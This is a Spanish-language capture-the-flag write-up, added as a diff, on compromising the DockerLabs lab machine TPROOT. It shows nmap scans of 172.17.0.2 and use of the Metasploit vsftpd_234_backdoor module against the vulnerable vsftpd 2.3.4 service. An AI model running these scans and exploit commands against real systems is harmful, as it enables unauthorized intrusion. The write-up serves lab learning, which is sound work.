@@ -1,1 +1,108 @@
 
+documentación 
+********************************
+https://albertoestrada.es/hacking/write-up/dockerlabs/tproot/
+*************************************
+
+En el siguiente writeup vamos a resolver la máquina de la plataforma de DockerLabs TPROOT, clasificada con nivel de seguridad “Muy Fácil”.
+
+Técnicas aplicadas para la resolución de la máquina:
+
+
+
+Escaneo de Puertos
+Seachsploit
+Metasploit
+
+
+Descargar la máquina docker
+	
+megadl  https://mega.nz/file/ORUEzLia#WQgvveTv3kAnXBs6UyRShd1JomGNg6Sk7DSa_fJwD7k
+
+
+
+Descomprimir la máquina:-
+unzip tproot.zip 
+
+┌──(kali㉿kali)-[~/Documents/maquinas/tproot]
+└─$ unzip tproot.zip 
+Archive:  tproot.zip
+  inflating: auto_deploy.sh          
+  inflating: tproot.tar   
+-
+
+
+
+
+
+
+
+
+
+
+
+Desplegar la máquina:
+bash auto_deploy.sh tproot.tar
+
+┌──(kali㉿kali)-[~/Documents/maquinas/tproot]
+└─$ sudo bash auto_deploy.sh tproot.tar
+[sudo] password for kali: 
+
+
+			
+
+Trás el despliegue de la máquina ya disponemos del direccionamiento ip de la máquina, Desde una nueva terminal comprobaremos que hacemos ping a la mv, y realizaremos un primer escaneo de puertos con nmap.
+
+ESCANEO DE PUERTOS:
+
+
+
+
+
+
+
+
+
+
+
+
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
+
+
+
+
+nmap -sCV -p 21,80 172.17.0.2
+
+
+
+
+ANÁLISIS DEL ESCANEO DE PUERTOS:
+
+Trás el análisis observamos que la mv objetivo, tiene activos los servicios de ftp y apache2.
+Exploramos el mediante el navegador web, que web nos encontramos alojada en el servidor.
+
+
+En lo referido al servicio de vsftpd, observamos que se trata de la versión 2.3.4, está versión puede ser vulnerable a un exploit de metaexploit, vamos a investigar sí por aquí la vm puede ser vulnerable.
+
+ESCALADA DE PRIVILEGIOS.
+
+METAEXPLOIT:
+
+msfconsole -q
+
+Ahora debemos buscar el exploit para el servicio a vulnerar en nuestro caso vsftpd 2.3.4
+
+
+
+Indicamos el exploit a usar con “use” y configuramos el exploit con los parámetros que nos solicita, en este caso indicaremos la ip de la mv víctima con “set RHOST IP” :
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOST 172.17.0.2
+
+
+
+
+
+Así pues daremos por finalizada la intrusión en la máquina.
